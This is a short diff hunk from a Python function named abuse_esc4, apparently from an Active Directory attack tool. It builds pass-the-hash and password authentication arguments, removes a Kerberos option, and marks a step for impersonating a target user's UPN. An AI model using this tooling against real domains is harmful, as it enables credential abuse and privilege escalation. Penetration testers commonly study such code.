@@ -22,8 +22,6 @@ def abuse_esc4(session, template):
         auth = f"-u {session.username} -hashes :{session.hash}"
     elif session.password:
         auth = f"-u {session.username} -p '{session.password}'"
-    else:
-        auth = f"-u {session.username} -k --no-pass"
 
 
     # Step 2: Ask target UPN to impersonate
